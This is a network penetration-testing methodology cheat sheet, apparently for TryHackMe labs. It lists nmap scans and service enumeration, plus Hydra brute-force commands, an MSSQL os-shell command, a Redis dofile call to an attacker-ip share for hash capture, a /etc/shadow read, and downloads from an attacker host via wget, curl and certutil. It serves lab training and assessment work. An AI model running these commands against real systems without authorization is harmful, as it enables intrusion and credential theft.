# Network Security Methodology

## 1. Initial Scanning

```bash
# Full port scan — always use -Pn on THM (ICMP often blocked)
nmap -sC -sV -Pn -p- -vv <TARGET-IP> -oA initial

# UDP scan (top ports — full UDP scan is very slow)
nmap -sU --top-ports 100 <TARGET-IP>

# If host still appears down, try:
nmap -sC -sV -Pn -p 22,80,443,445,3389 <TARGET-IP>
```

## 2. Service-by-Service Checklist

### FTP (21)
```bash
ftp <TARGET-IP>           # try anonymous login: user=anonymous, pass=anything
nmap --script ftp-anon <TARGET-IP>
```
- Check for readable/writable directories
- Download everything: `prompt off; mget *`

### SSH (22)
- Note version — check for CVEs if old (e.g. OpenSSH < 7.7 user enum)
- Only viable with creds or a key found elsewhere
- Try default/found creds last

### SMTP (25 / 587)
```bash
nc <TARGET-IP> 25
EHLO test
VRFY root          # user enumeration
```

### DNS (53)
```bash
# Zone transfer attempt
dig axfr <domain> @<TARGET-IP>
fierce --domain <domain> --dns-servers <TARGET-IP>
```

### HTTP/HTTPS (80 / 443 / 8080 / 8443)
→ See Web Security Methodology

### SMB (445)
```bash
nmap --script smb-vuln* <TARGET-IP>     # EternalBlue, etc.
nxc smb <TARGET-IP>                     # fingerprint
enum4linux -a <TARGET-IP>               # full enum
smbclient -L //<TARGET-IP> -N           # anonymous share list
```
- Check for MS17-010 (EternalBlue) on Windows 7/Server 2008
- Check for readable shares containing credentials or config files

### MSSQL (1433)
```bash
nxc mssql <TARGET-IP> -u <user> -p <password>
# If SA account and xp_cmdshell enabled:
nxc mssql <TARGET-IP> -u sa -p <password> --os-shell
```

### RDP (3389)
```bash
xfreerdp /u:<user> /p:<password> /v:<TARGET-IP>
# BlueKeep (CVE-2019-0708) — check unpatched Server 2008/Windows 7
nmap --script rdp-vuln-ms12-020 <TARGET-IP>
```

### WinRM (5985 / 5986)
```bash
evil-winrm -i <TARGET-IP> -u <user> -p <password>
# Requires user to be in Remote Management Users group
```

### Redis (6379)
```bash
redis-cli -h <TARGET-IP>
info                        # check version, OS, config
config get dir              # check if writable path
# LLMNR trigger (if Responder running):
redis-cli -h <TARGET-IP> EVAL "dofile('\\\\\\\\<attacker-ip>\\\\share')" 0
```

### MySQL (3306)
```bash
mysql -h <TARGET-IP> -u root -p
show databases;
use <db>; show tables;
select * from users;
```

## 3. Vulnerability Scanning

```bash
# Targeted vuln scripts (after identifying service versions)
nmap --script vuln <TARGET-IP>

# Searchsploit — offline exploit-db search
searchsploit <service> <version>
searchsploit -m <exploit-id>    # copy exploit to current dir
```

## 4. Password Attacks

```bash
# Hydra — generic online brute force
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <protocol>://<TARGET-IP>
hydra -L users.txt -P passwords.txt ssh://<TARGET-IP>

# Common services: ssh, ftp, http-post-form, rdp, smb

# HTTP form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET-IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
```

## 5. Post-Exploitation (Linux)

```bash
# Shell stabilisation
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Enumeration
sudo -l
find / -perm -4000 2>/dev/null       # SUID
find / -perm -2000 2>/dev/null       # SGID
cat /etc/crontab; crontab -l
ls -la /etc/cron*
cat /etc/passwd
cat /etc/shadow                      # if readable — crack with hashcat/john
ss -tlnp                             # listening services (internal ports)
```

## 6. Post-Exploitation (Windows)

```powershell
whoami /priv                         # check SeImpersonatePrivilege etc.
net users
net localgroup administrators
systeminfo                           # OS version, hotfixes
wmic qfe list                        # installed patches
```

```bash
# Common privesc vectors
# SeImpersonatePrivilege → PrintSpoofer or GodPotato
# Unquoted service path
# Weak service permissions
# AlwaysInstallElevated
```

## 7. File Transfers

```bash
# Attacker serving files (allow port 80 in UFW first)
python3 -m http.server 80

# Download on Linux target
wget http://<attacker-ip>/file
curl http://<attacker-ip>/file -o file

# Download on Windows target
certutil -urlcache -split -f http://<attacker-ip>/file file
iwr http://<attacker-ip>/file -OutFile file    # PowerShell
```
